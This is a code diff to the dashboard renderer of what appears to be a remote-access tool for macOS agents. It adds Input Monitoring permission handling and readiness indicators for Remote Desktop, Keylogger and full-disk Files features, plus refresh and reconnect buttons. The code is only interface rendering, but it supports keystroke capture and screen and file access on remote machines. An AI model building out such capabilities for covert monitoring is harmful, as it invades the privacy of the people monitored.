@@ -208,6 +208,7 @@ function isMacClient(client) {
 const MAC_PERMISSION_LABELS = [
   ["accessibility", "Accessibility"],
   ["screenRecording", "Screen Recording"],
+  ["inputMonitoring", "Input Monitoring"],
   ["fullDiskAccess", "Full Disk Access"],
 ];
 
@@ -234,12 +235,36 @@ function macPermissionDetailHtml(client) {
   if (!state) return "";
   const ok = state.missing.length === 0;
   const summary = ok ? "All required permissions granted" : `Missing: ${state.missing.map((item) => item.label).join(", ")}`;
+  const granted = Object.fromEntries(state.items.map((item) => [item.key, item.granted]));
+  const featureItems = [
+    {
+      label: "Remote Desktop",
+      ready: granted.screenRecording && granted.accessibility,
+      missing: ["screenRecording", "accessibility"].filter((key) => !granted[key]),
+    },
+    {
+      label: "Keylogger",
+      ready: granted.accessibility && granted.inputMonitoring,
+      missing: ["accessibility", "inputMonitoring"].filter((key) => !granted[key]),
+    },
+    {
+      label: "Files",
+      ready: granted.fullDiskAccess,
+      missing: granted.fullDiskAccess ? [] : ["fullDiskAccess"],
+    },
+  ];
+  const labelFor = (key) => MAC_PERMISSION_LABELS.find(([k]) => k === key)?.[1] || key;
   const chips = state.items.map((item) => `
-    <button type="button" class="cv-perm-chip ${item.granted ? "is-ok" : "is-missing"}" data-mac-permission-key="${escapeHtml(item.key)}" title="Request ${escapeHtml(item.label)} permission">
+    <button type="button" class="cv-perm-chip ${item.granted ? "is-ok" : "is-missing"}" data-mac-permission-key="${escapeHtml(item.key)}" title="${escapeHtml(item.key === "inputMonitoring" ? "Request Input Monitoring permission; reconnect required after granting" : `Request ${item.label} permission`)}">
       <i class="fa-solid ${item.granted ? "fa-check" : "fa-xmark"}"></i>${escapeHtml(item.label)}
     </button>
   `).join("");
-  return `<div class="cv-field cv-field-wide cv-field-macperms"><span class="cv-field-label">macOS Permissions</span><span class="cv-field-value cv-perm-list"><span class="cv-perm-summary ${ok ? "is-ok" : "is-warn"}">${escapeHtml(summary)}</span>${chips}</span></div>`;
+  const readiness = featureItems.map((item) => `
+    <span class="cv-ready-chip ${item.ready ? "is-ok" : "is-warn"}" title="${escapeHtml(item.ready ? "Ready" : `Missing ${item.missing.map(labelFor).join(", ")}`)}">
+      <i class="fa-solid ${item.ready ? "fa-circle-check" : "fa-circle-exclamation"}"></i>${escapeHtml(item.label)}
+    </span>
+  `).join("");
+  return `<div class="cv-field cv-field-wide cv-field-macperms"><span class="cv-field-label">macOS Permissions</span><span class="cv-field-value cv-perm-list"><span class="cv-perm-summary ${ok ? "is-ok" : "is-warn"}">${escapeHtml(summary)}</span>${chips}<span class="cv-perm-freshness">Checked ${escapeHtml(formatAgo(client.lastSeen))}; Input Monitoring updates after reconnect</span><span class="cv-perm-readiness">${readiness}</span><span class="cv-perm-actions"><button type="button" class="cv-perm-tool" data-mac-permission-refresh="1" title="Re-check permissions except Input Monitoring"><i class="fa-solid fa-rotate"></i>Refresh</button><button type="button" class="cv-perm-tool" data-mac-permission-apply="1" title="Reconnect agent to apply newly granted permissions"><i class="fa-solid fa-power-off"></i>Apply</button></span></span></div>`;
 }
 
 function shortOsLabel(osRaw = "") {
@@ -282,6 +307,8 @@ export function createRenderer({
   requestThumbnail,
   pingClient,
   onMacPermissionRequest,
+  onMacPermissionRefresh,
+  onMacPermissionApply,
   userRole,
   getServerVersion,
   getDisplayFields,
@@ -387,6 +414,20 @@ export function createRenderer({
         e.preventDefault();
         e.stopPropagation();
         if (onMacPermissionRequest) onMacPermissionRequest(clientId, card, macPermBtn.dataset.macPermissionKey);
+        return;
+      }
+
+      if (e.target.closest("[data-mac-permission-refresh]")) {
+        e.preventDefault();
+        e.stopPropagation();
+        if (onMacPermissionRefresh) onMacPermissionRefresh(clientId, card);
+        return;
+      }
+
+      if (e.target.closest("[data-mac-permission-apply]")) {
+        e.preventDefault();
+        e.stopPropagation();
+        if (onMacPermissionApply) onMacPermissionApply(clientId, card);
         return;
       }
 
